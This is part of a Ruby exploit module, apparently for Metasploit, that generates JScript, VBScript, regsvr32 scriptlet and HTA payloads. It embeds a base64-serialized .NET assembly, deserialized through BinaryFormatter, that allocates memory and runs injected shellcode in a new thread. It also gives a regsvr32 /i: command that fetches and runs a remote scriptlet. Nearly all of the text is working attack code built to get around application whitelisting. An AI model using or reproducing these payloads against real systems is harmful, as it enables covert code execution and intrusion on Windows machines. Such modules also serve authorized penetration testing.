       "IGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAgPC9yZXF1ZXN0ZWRQ"+
       "cml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4A"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAQDoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
       "AAAAAAAAAAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxl"+
       "Y3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL";
       var entry_class = 'meta';

       try {
        setversion();
        var stm = base64ToStream(serialized_obj);
        var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
        var al = new ActiveXObject('System.Collections.ArrayList');
        var n = fmt.SurrogateSelector;
        var d = fmt.Deserialize_2(stm);
        al.Add(n);
        var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
        o.sc_in(enc);
       } catch (e) {
       debug(e.message);
       }
    HEREDOC
  end


  def vbscript
    esc = build_payload
    <<-HEREDOC
       Dim enc : enc = "#{esc}"
       Sub DebugPrint(s)
       End Sub

       Sub SetVersion
       Dim shell
       Set shell = CreateObject("WScript.Shell")
       Dim ver
       ver = "v4.0.30319"
       On Error Resume Next
       shell.RegRead "HKLM\\SOFTWARE\\\\Microsoft\\.NETFramework\\v4.0.30319\\"
       If Err.Number <> 0 Then
        ver = "v2.0.50727"
        Err.Clear
       End If
       shell.Environment("Process").Item("COMPLUS_Version") = ver
       End Sub

       Function Base64ToStream(b)
        Dim enc, length, ba, transform, ms
        Set enc = CreateObject("System.Text.ASCIIEncoding")
        length = enc.GetByteCount_2(b)
        Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform")
        Set ms = CreateObject("System.IO.MemoryStream")
        ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
        ms.Position = 0
        Set Base64ToStream = ms
       End Function

       Sub Run
       Dim s, entry_class
       s = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"
       s = s & "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"
       s = s & "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"
       s = s & "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"
       s = s & "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"
       s = s & "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"
       s = s & "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"
       s = s & "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"
       s = s & "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"
       s = s & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"
       s = s & "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"
       s = s & "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"
       s = s & "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"
       s = s & "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"
       s = s & "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"
       s = s & "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"
       s = s & "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"
       s = s & "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"
       s = s & "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"
       s = s & "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
       s = s & "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"
       s = s & "ZW1ibHkGFwAAAARMb2FkCg8MAAAAABYAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"
       s = s & "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAswd3WQAAAAAA"
       s = s & "AAAA4AAiAAsBMAAADAAAAAgAAAAAAAA+KgAAACAAAABAAAAAAEAAACAAAAACAAAEAAAAAAAAAAQA"
       s = s & "AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA7CkA"
       s = s & "AE8AAAAAQAAAvAUAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAALQoAAAcAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"
       s = s & "AAAALnRleHQAAABECgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAvAUAAABA"
       s = s & "AAAABgAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAUAAAAAAAAAAAA"
       s = s & "AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAACAqAAAAAAAASAAAAAIABQDkIAAA0AcAAAEAAAABAAAG"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABioAABMwBgBe"
       s = s & "AAAAAQAAESgGAAAGFigFAAAGJgMoDgAACgp+DwAACgaOaWooEAAACn4BAAAEfgIAAAQoAgAABgsG"
       s = s & "FgcGjmkoEQAACn4PAAAKDAh+EgAACgcIFhICKAMAAAZ+AwAABCgEAAAGJioeAigTAAAKKnYgABAA"
       s = s & "AIABAAAEH0AoFAAACoACAAAEFYADAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUA"
       s = s & "bAAAABQDAAAjfgAAgAMAABwDAAAjU3RyaW5ncwAAAACcBgAABAAAACNVUwCgBgAAEAAAACNHVUlE"
       s = s & "AAAAsAYAACABAAAjQmxvYgAAAAAAAAACAAABVx0CFAkAAAAA+gEzABYAAAEAAAATAAAAAgAAAAUA"
       s = s & "AAAJAAAADwAAABQAAAACAAAADgAAAAEAAAADAAAABQAAAAEAAAABAAAAAADmAQEAAAAAAAYAWwGO"
       s = s & "AgYAyAGOAgYAqABcAg8ArgIAAAYA0AAuAgYAPgEuAgYAHwEuAgYArwEuAgYAewEuAgYAlAEuAgYA"
       s = s & "5wAuAgYAvABvAgYAmgBvAgYAAgEuAgYAzQIcAgYA4AIcAgYAVQIcAgYAVAIcAgYACQJvAgAAAAAf"
       s = s & "AAAAAAABAAEAAQAQAGYAAAA9AAEAAQARAFAAUwARADkAJwARADAAVgBRgCgAUwBRgFsAUwBQIAAA"
       s = s & "AACRACkCWQABAAAAAACAAJEgeABdAAEAAAAAAIAAkSCFAGUABQAAAAAAgACRIMACcAALAAAAAACA"
       s = s & "AJEgAAN2AA0AAAAAAIAAkSDvAnwADwBUIAAAAACGACMCEAAPAL4gAAAAAIYYRwIGABAAxiAAAAAA"
       s = s & "kRhNAlkAEAAAAAEAaQAAAAIAvgIAAAMA7QIAAAQARQIAAAEA6wIAAAIA6AIAAAMAYwAAAAQARQIA"
       s = s & "AAUAgwAAAAYAkgAAAAEABwIAAAIAvQIAAAEAlQAAAAIACwMAAAEAdAAJAEcCAQARAEcCBgAZAEcC"
       s = s & "CgApAEcCEAAxAEcCEAA5AEcCEABBAEcCEABJAEcCEABRAEcCEABZAEcCEABhAEcCFQBpAEcCEABx"
       s = s & "AEcCEACBAPYBIQCJAEACJwCRANQCKgCZABQDLwCRAEACOAB5AEcCBgCJANQCOwAIABAASQAIABQA"
       s = s & "TgAuAAsAgAAuABMAiQAuABsAqAAuACMAsQAuACsAwgAuADMAwgAuADsAwgAuAEMAsQAuAEsAyAAu"
       s = s & "AFMAwgAuAFsAwgAuAGMA4AAuAGsACgFDAFsAFwEaABYAEQINAAABBQB4AAEAAAEHAIUAAQAAAQkA"
       s = s & "wAIBAAABCwAAAwIAAAENAO8CAwAEgAAAAQAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAQABr"
       s = s & "AAAAAAAAAAAAAENvbnNvbGVBcHAxAEtlcm5lbDMyAGtlcm5lbDMyADxNb2R1bGU+AFNXX0hJREUA"
       s = s & "SU5GSU5JVEUAUEFHRV9FWEVDVVRFX1JFQURXUklURQBNRU1fQ09NTUlUAFNXX1NIT1cAc2EAbWV0"
       s = s & "YQBtc2NvcmxpYgBlbmMAVmlydHVhbEFsbG9jAENyZWF0ZVRocmVhZABpZABoV25kAEd1aWRBdHRy"
       s = s & "aWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0"
       s = s & "bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lv"
       s = s & "bkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlw"
       s = s & "dGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJv"
       s = s & "ZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlB"
       s = s & "dHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQ29uc29sZUFwcDEuZXhlAEZy"
       s = s & "b21CYXNlNjRTdHJpbmcAaABNYXJzaGFsAHVzZXIzMi5kbGwAU3lzdGVtAHNjX2luAE1haW4AU3lz"
       s = s & "dGVtLlJlZmxlY3Rpb24AWmVybwBwAC5jdG9yAC5jY3RvcgBVSW50UHRyAFN5c3RlbS5EaWFnbm9z"
       s = s & "dGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGls"
       s = s & "ZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBtcwBXYWl0Rm9yU2luZ2xlT2JqZWN0AG9wX0V4cGxp"
       s = s & "Y2l0AENvbnZlcnQAc3QAYXR0AEdldENvbnNvbGVXaW5kb3cAU2hvd1dpbmRvdwBuQ21kU2hvdwBD"
       s = s & "b3B5AAAAAAAAAABuhaTR9O3GRKCd/bQkGE2PAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIGBwMd"
       s = s & "BRgYBQABHQUOAgYYBAABGQsIAAQBHQUIGAgCBhkEAAEYCAi3elxWGTTgiQQAAAAABAUAAAACBggC"
       s = s & "BgkDAAABBwAEGBgZCBgKAAYYGBkYGAgQGAUAAgkYCQUAAgIYCAMAABgIAQAIAAAAAAAeAQABAFQC"
       s = s & "FldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAAEAEAC0NvbnNvbGVBcHAxAAAFAQAAAAAX"
       s = s & "AQASQ29weXJpZ2h0IMKpICAyMDE3AAApAQAkMjc4Y2NlYjYtYmEyZi00NDljLWE0MWUtMTA5YmU4"
       s = s & "ODQ0YTQ1AAAMAQAHMS4wLjAuMAAABQEAAQAAAAAAAAAAALMHd1kAAAAAAgAAABwBAADQKAAA0AoA"
       s = s & "AFJTRFOoH3QpJw5sQpkQDW66wbA6AQAAAGM6XHVzZXJzXGJvYlxkb2N1bWVudHNcdmlzdWFsIHN0"
       s = s & "dWRpbyAyMDE3XFByb2plY3RzXENvbnNvbGVBcHAxXENvbnNvbGVBcHAxXG9ialxSZWxlYXNlXENv"
       s = s & "bnNvbGVBcHAxLnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "FCoAAAAAAAAAAAAALioAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAqAAAAAAAAAAAAAAAAX0Nv"
       s = s & "ckV4ZU1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAAgBgAAABQAACAAAAAAAAA"
       s = s & "AAAAAAAAAAABAAEAAAA4AACAAAAAAAAAAAAAAAAAAAABAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAB"
       s = s & "AAEAAABoAACAAAAAAAAAAAAAAAAAAAABAAAAAAC8AwAAkEAAACwDAAAAAAAAAAAAACwDNAAAAFYA"
       s = s & "UwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/"
       s = s & "AAAAAAAAAAQAAAABAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAA"
       s = s & "AAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASMAgAAAQBTAHQAcgBpAG4AZwBG"
       s = s & "AGkAbABlAEkAbgBmAG8AAABoAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUA"
       s = s & "bgB0AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAQAAMAAEARgBp"
       s = s & "AGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEMAbwBuAHMAbwBsAGUAQQBwAHAAMQAAADAA"
       s = s & "CAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAwAC4AMAAAAEAAEAABAEkAbgB0"
       s = s & "AGUAcgBuAGEAbABOAGEAbQBlAAAAQwBvAG4AcwBvAGwAZQBBAHAAcAAxAC4AZQB4AGUAAABIABIA"
       s = s & "AQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAg"
       s = s & "ADIAMAAxADcAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEgA"
       s = s & "EAABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABDAG8AbgBzAG8AbABlAEEAcABw"
       s = s & "ADEALgBlAHgAZQAAADgADAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAQwBvAG4AcwBvAGwA"
       s = s & "ZQBBAHAAcAAxAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAw"
       s = s & "AC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAA"
       s = s & "LgAwAAAAzEMAAOoBAAAAAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVU"
       s = s & "Ri04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCg0KPGFzc2VtYmx5IHhtbG5zPSJ1cm46c2NoZW1hcy1t"
       s = s & "aWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0KICA8YXNzZW1ibHlJ"
       s = s & "ZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJNeUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8"
       s = s & "dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAg"
       s = s & "PHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXMgeG1sbnM9InVybjpzY2hlbWFz"
       s = s & "LW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVs"
       s = s & "IGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAgPC9yZXF1ZXN0ZWRQ"
       s = s & "cml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4A"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAQDoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       s = s & "AAAAAAAAAAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxl"
       s = s & "Y3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL"
       entry_class = "meta"

       Dim fmt, al, d, o
       Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
       Set al = CreateObject("System.Collections.ArrayList")
       al.Add fmt.SurrogateSelector

       Set d = fmt.Deserialize_2(Base64ToStream(s))
       Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
       o.sc_in(enc)
       End Sub

       SetVersion
       On Error Resume Next
       Run
       If Err.Number <> 0 Then
        DebugPrint Err.Description
        Err.Clear
       End If
    HEREDOC
  end


  def regsvr
    "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!--\nCopy the entire contents of this page to a file named regsvr.sct\nExecute by right clicking regsvr.sct and selecting Unregister\nor\nExecute using: C:\\Windows\\System32\\regsvr32.exe /s /n /u /i:#{get_uri} scrobj.dll\n-->\n<package>\n<component id=\"dummy\">\n<registration\ndescription=\"dummy\"\nprogid=\"dummy\"\nversion=\"1.00\"\nremotable=\"True\">\n<script language=\"VBScript\">\n<![CDATA[\n" + vbscript + "]]>\n</script>\n</registration>\n</component>\n</package>\n"
  end


  def hta
    if payload.arch.first == ARCH_X64
        fail_with(Failure::NoTarget, '64-bit payloads are not supported by this bypass technique.')
    end
    "<!--\nCopy the entire contents of this page to a file named hta.hta\nExecute by double clicking hta.hta\n-->\n<script language=\"VBScript\">\n" + vbscript + "</script>"
  end
end
